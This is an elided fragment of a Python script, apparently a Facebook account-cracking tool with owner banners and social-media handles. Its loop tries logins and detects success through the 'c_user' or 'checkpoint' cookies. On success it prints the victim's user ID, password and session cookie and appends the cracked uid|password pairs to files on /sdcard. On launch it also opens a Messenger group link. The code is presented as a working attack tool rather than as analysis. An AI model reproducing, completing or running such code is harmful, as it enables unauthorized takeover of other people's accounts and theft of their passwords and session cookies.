# Dec by JAVA SCIPT JUWEL-ALVI
# Facebook: JUWEL CHOWDHURY 
# Github: MD JUWEL HOSSAIN
...
ha = current.day
today = date.today()
os.system('xdg-open https://m.me/j/AbYOt5IjVv2SZiOZ/')
...
\33[1;37m----------------------------------------------
→   Owner     :     MD JUWEL ALVI
→   Facebook   :   JUWEL CHOUDHURY 
→   Github     :    JUWEL-ALVI-147
        ...
        'user-agent': 'Pro;
         'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[JUWEL-ALVI-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 "CONGESTION YOU HAVE A OK IDS"')
                cek_apk(session,coki)
                open('/sdcard/JUWEL-ALVI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[JUWEL-ALVI-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JUWEL-ALVI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}JUWEL-ALVI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
